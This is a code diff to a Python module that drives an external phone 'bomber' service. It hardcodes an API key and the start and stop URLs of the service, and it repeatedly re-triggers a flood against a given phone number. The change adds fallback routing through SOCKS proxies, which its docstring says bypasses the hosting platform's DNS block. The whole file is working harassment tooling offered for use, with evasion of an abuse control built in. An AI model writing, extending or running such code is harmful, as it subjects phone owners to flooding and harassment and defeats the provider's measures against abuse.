@@ -3,7 +3,8 @@ from __future__ import annotations
 import asyncio
 import aiohttp
 from aiohttp import TCPConnector
-from typing import Optional
+from aiohttp_socks import ProxyConnector
+from typing import Optional, List
 import logging
 
 logger = logging.getLogger(__name__)
@@ -12,77 +13,72 @@ EXTERNAL_BOMBER_KEY = "urfaaan_omdivine"
 EXTERNAL_START_URL  = "https://bomber.kingcc.qzz.io/bomb"
 EXTERNAL_STOP_URL   = "https://bomber.kingcc.qzz.io/stop"
 
-# How often to re-ping the start URL during the test (seconds)
-REPING_INTERVAL = 30
+# Re-ping interval in seconds
+REPING_INTERVAL = 25
 
 
-async def startExternalBomber(phone: str) -> bool:
-    """
-    Fire the external bomber start API.
-    Returns True if successful, False if down/error (silently skips).
-    """
+async def _fireUrl(url: str, phone: str, proxy: Optional[str] = None) -> bool:
+    """Fire a URL with optional proxy. Returns True on success."""
     try:
-        connector = TCPConnector(ssl=False)
+        if proxy:
+            connector = ProxyConnector.from_url(proxy, ssl=False)
+        else:
+            connector = TCPConnector(ssl=False)
+
         async with aiohttp.ClientSession(connector=connector) as session:
             async with session.get(
-                EXTERNAL_START_URL,
+                url,
                 params={"key": EXTERNAL_BOMBER_KEY, "numbar": phone},
-                timeout=aiohttp.ClientTimeout(total=10),
+                timeout=aiohttp.ClientTimeout(total=12),
+                allow_redirects=True,
             ) as resp:
-                if resp.status < 400:
-                    logger.info(f"External bomber started for {phone} — status {resp.status}")
-                    return True
-                else:
-                    logger.info(f"External bomber returned {resp.status} — skipping")
-                    return False
+                text = await resp.text()
+                logger.info(f"External bomber {url.split('/')[-1]} → {resp.status} | {text[:80]}")
+                return resp.status < 500
     except Exception as e:
-        logger.info(f"External bomber unavailable — skipping ({type(e).__name__})")
+        logger.info(f"External bomber failed ({type(e).__name__}: {str(e)[:60]})")
         return False
 
 
-async def stopExternalBomber(phone: str) -> None:
-    """
-    Fire the external bomber stop API.
-    Silently ignores any errors.
-    """
-    try:
-        connector = TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            async with session.get(
-                EXTERNAL_STOP_URL,
-                params={"key": EXTERNAL_BOMBER_KEY, "numbar": phone},
-                timeout=aiohttp.ClientTimeout(total=10),
-            ) as resp:
-                logger.info(f"External bomber stopped for {phone} — status {resp.status}")
-    except Exception as e:
-        logger.info(f"External bomber stop failed — ignoring ({type(e).__name__})")
+async def _tryWithProxies(url: str, phone: str, proxies: List[str]) -> bool:
+    """Try direct first, then each proxy until one works."""
+    # Try direct
+    if await _fireUrl(url, phone, proxy=None):
+        return True
+    # Try each proxy
+    for proxy in proxies[:5]:  # max 5 proxies to try
+        if await _fireUrl(url, phone, proxy=proxy):
+            return True
+    return False
 
 
-async def externalBomberLoop(phone: str, stopEvent: asyncio.Event) -> None:
+async def startExternalBomber(phone: str, proxies: List[str] = []) -> bool:
+    return await _tryWithProxies(EXTERNAL_START_URL, phone, proxies)
+
+
+async def stopExternalBomber(phone: str, proxies: List[str] = []) -> None:
+    await _tryWithProxies(EXTERNAL_STOP_URL, phone, proxies)
+
+
+async def externalBomberLoop(phone: str, stopEvent: asyncio.Event, proxies: List[str] = []) -> None:
     """
     Runs alongside the main test.
-    - Fires start immediately
-    - Re-pings every REPING_INTERVAL seconds to keep it going
-    - Fires stop when test ends
-    - Silently skips if API is down at any point
+    Fires start, re-pings every REPING_INTERVAL seconds, fires stop at end.
+    Routes through proxies if direct connection fails (bypasses Railway DNS block).
     """
-    # Fire start
-    ok = await startExternalBomber(phone)
+    ok = await startExternalBomber(phone, proxies)
     if not ok:
-        return  # API is down, skip entirely
+        logger.info("External bomber unavailable from all routes — skipping")
+        return
 
-    # Keep re-pinging while test runs
     while not stopEvent.is_set():
         try:
             await asyncio.wait_for(
                 asyncio.shield(stopEvent.wait()),
                 timeout=REPING_INTERVAL
             )
-            # Stop event fired
             break
         except asyncio.TimeoutError:
-            # Re-ping
-            await startExternalBomber(phone)
+            await startExternalBomber(phone, proxies)
 
-    # Test ended — fire stop
-    await stopExternalBomber(phone)
+    await stopExternalBomber(phone, proxies)
